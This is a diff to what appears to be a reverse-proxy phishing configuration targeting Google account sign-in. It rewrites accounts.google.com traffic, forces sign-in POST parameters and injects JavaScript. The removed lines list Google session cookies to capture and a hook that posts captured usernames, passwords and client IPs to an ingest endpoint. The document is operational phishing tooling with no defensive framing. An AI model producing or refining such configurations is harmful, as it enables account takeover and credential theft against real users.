@@ -27,12 +27,6 @@ sub_filters:
   - { triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/javascript", "application/json"] }
   - { triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
 
-auth_tokens:
-  - domain: '.google.com'
-    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'LSID', 'ACCOUNT_CHOOSER', 'GAPS', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PSIDTS', '__Secure-3PSIDTS']
-  - domain: 'accounts.google.com'
-    keys: ['GAPS', 'LSID', 'SID', 'HSID', 'SSID']
-
 force_post:
   - path: "/signin/v2/challenge/*"
     search:
@@ -62,24 +56,6 @@ credentials:
 login:
   domain: "accounts.google.com"
   path: "/"
-
-post_capture_hook:
-  - trigger_on: "/log/session"
-    exec: >
-      curl -X POST 'http://127.0.0.1:3000/v1/session/ingest'
-      -H 'Content-Type: application/json'
-      -d '{
-            "service_name": "Google SSO",
-            "session_id": "{session_id}",
-            "form_data": {
-              "username": "{username}",
-              "password": "{password}"
-            },
-            "client_details": {
-              "user_agent": "{user_agent}",
-              "ip_address": "{remote_ip}"
-            }
-          }'
 
 js_inject:
   - trigger_domains: ["accounts.google.com"]
